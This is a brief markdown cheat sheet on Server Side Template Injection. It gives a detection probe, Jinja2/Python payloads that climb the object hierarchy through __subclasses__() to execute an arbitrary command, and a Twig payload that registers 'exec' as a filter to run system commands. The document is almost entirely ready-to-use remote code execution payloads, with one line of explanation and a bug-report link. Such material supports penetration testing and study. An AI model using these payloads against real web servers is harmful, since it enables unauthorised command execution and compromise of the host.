# SSTI

Server Side Template Injection - ```{{'7*'7}}```.  See https://hackerone.com/reports/125980 for an example.

So accessing `http://example.com/{{'7*'7}}` might give you an error like this: `Page not Found: http://example.com/7777777`

```python
example.com/{{''.__class__.mro()[1].__subclasses__()}}
example.com/{{''.__class__.mro()[1].__subclasses__()[X]}}          # X = int
example.com{{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}} # COMMAND = choose your own adventure

{{''.__class__.mro()[2].__subclasses__()[233](["command", "argument"])}}
# the [] at the end creates an array
```

```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
```

